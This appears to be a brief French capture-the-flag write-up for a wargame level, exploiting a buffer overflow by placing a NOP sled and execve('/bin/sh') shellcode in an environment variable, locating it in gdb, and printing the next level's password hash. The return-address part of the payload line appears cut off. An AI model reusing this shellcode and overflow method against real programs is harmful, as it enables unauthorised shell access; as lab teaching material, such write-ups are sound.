# Analyse du code

Buffer overflow normal. On voit que lon peut ecraser EIP.
Du coup nous allons utiliser un exploit en mettans notre shellcode dans les variables d'environement

# Preparation du payload

```bash
export LANG="nl"
export SHELLCODE=$(python -c 'print("\x90" * 1024 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")')
```

dans gdb 
(gdb) p/x getenv("SHELLCODE")
$1 = 0xbffff503

0xbffff503 + 0x200 = 0xbffff703

$(python -c "print('a' * 40)") $(python -c "print('b' * 23 + '')")



# Exploit

cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
